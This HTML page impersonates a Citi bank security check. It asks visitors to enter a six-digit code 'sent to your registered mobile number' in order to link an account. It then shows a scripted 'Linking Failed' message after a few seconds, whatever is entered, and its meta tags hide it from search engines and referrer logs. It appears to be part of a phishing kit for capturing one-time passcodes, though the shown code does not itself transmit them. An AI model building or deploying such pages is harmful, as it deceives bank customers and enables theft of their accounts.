<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate, noodp">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="google" content="notranslate">
  <meta name="referrer" content="no-referrer">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | Citi Financials Secure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet" />
    <style>
        body { font-family: 'Inter', sans-serif; background: #f4f7f9; }
        .otp-input { width: 45px; height: 55px; text-align: center; font-size: 24px; font-weight: 800; border: 1px solid #D1D1D1; border-radius: 2px; transition: all 0.2s; background: white; }
        .otp-input:focus { border-color: var(--bank-color, #056dae); outline: none; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="w-full max-w-md bg-white rounded-sm p-10 border border-[#D1D1D1]" id="otp-card">
        <div class="flex flex-col items-center text-center mb-10">
            <div id="bank-logo-container" class="w-20 h-20 rounded-sm bg-white p-3 mb-6 border border-[#D1D1D1] flex items-center justify-center">
                <img id="bank-logo" src="" alt="Bank Logo" class="w-full h-full object-contain">
            </div>
            <h1 class="text-xl font-black text-gray-900 mb-2 uppercase tracking-tight">Security Verification</h1>
            <p class="text-[13px] text-gray-500 leading-relaxed font-medium">We've sent a 6-digit security code to your registered mobile number.</p>
        </div>

        <form onsubmit="handleVerify(event)" class="space-y-8">
            <div class="flex justify-between gap-2" id="otp-inputs">
                <input type="text" maxlength="1" class="otp-input" required onkeyup="moveNext(this, 1)">
                <input type="text" maxlength="1" class="otp-input" required onkeyup="moveNext(this, 2)">
                <input type="text" maxlength="1" class="otp-input" required onkeyup="moveNext(this, 3)">
                <input type="text" maxlength="1" class="otp-input" required onkeyup="moveNext(this, 4)">
                <input type="text" maxlength="1" class="otp-input" required onkeyup="moveNext(this, 5)">
                <input type="text" maxlength="1" class="otp-input" required onkeyup="moveNext(this, 6)">
            </div>

            <button type="submit" id="verify-btn" class="w-full py-4 bg-[#056dae] text-white rounded-sm font-black uppercase tracking-[0.2em] text-[10px] hover:opacity-90 transition-all active:scale-[0.98]">
                Verify & Link Account
            </button>
        </form>

        <div class="mt-8 text-center">
            <p class="text-xs text-gray-400 mb-4">Didn't receive the code?</p>
            <button class="text-xs font-bold text-[#056dae] hover:underline uppercase tracking-tight" style="color: var(--bank-color)">Resend Code</button>
        </div>
    </div>

    <div id="failure-modal" class="fixed inset-0 z-[100] hidden items-center justify-center p-4 bg-black/40 backdrop-blur-sm">
        <div class="w-full max-w-sm bg-white rounded-sm p-10 border border-[#D1D1D1] text-center animate-in fade-in zoom-in duration-300">
            <div class="w-16 h-16 bg-rose-50 text-rose-600 rounded-sm flex items-center justify-center mx-auto mb-8 border border-rose-100">
                <span class="material-symbols-outlined text-3xl font-black">error</span>
            </div>
            <h2 class="text-lg font-black text-gray-900 mb-3 uppercase tracking-tight">Linking Failed</h2>
            <p class="text-[13px] text-gray-500 mb-10 leading-relaxed font-medium">We were unable to verify your account at this time. Please try again later or contact support.</p>
            <button onclick="window.location.href = 'dashboard.html'" class="w-full py-4 bg-[#056dae] text-white rounded-sm font-black uppercase tracking-[0.2em] text-[10px] hover:bg-[#001a35] transition-all">
                Return to Dashboard
            </button>
        </div>
    </div>

    <script src="utils.js"></script>
    <script>
        const bankData = JSON.parse(sessionStorage.getItem('linked_bank_pending'));
        
        document.addEventListener('DOMContentLoaded', () => {
            if (!bankData) {
                window.location.href = 'dashboard.html';
                return;
            }
            
            document.getElementById('bank-logo').src = bankData.logo;
            document.body.style.setProperty('--bank-color', bankData.color);
            document.getElementById('verify-btn').style.backgroundColor = bankData.color;

            // Start simulated timeout as soon as the page loads
            // The user wants it to fail after "a few seconds"
            setTimeout(() => {
                showFailure();
            }, 5000);
        });

        function moveNext(input, index) {
            if (input.value.length === 1 && index < 6) {
                document.querySelectorAll('.otp-input')[index].focus();
            }
        }

        function showFailure() {
            document.getElementById('otp-card').style.opacity = '0.5';
            document.getElementById('otp-card').style.pointerEvents = 'none';
            document.getElementById('failure-modal').classList.remove('hidden');
            document.getElementById('failure-modal').classList.add('flex');
        }

        function handleVerify(event) {
            event.preventDefault();
            const verifyBtn = document.getElementById('verify-btn');
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="material-symbols-outlined animate-spin">progress_activity</span>';
            
            // Just show the failure modal after a shorter delay if they click verify
            setTimeout(() => {
                showFailure();
            }, 1500);
        }
    </script>
</body>
</html>
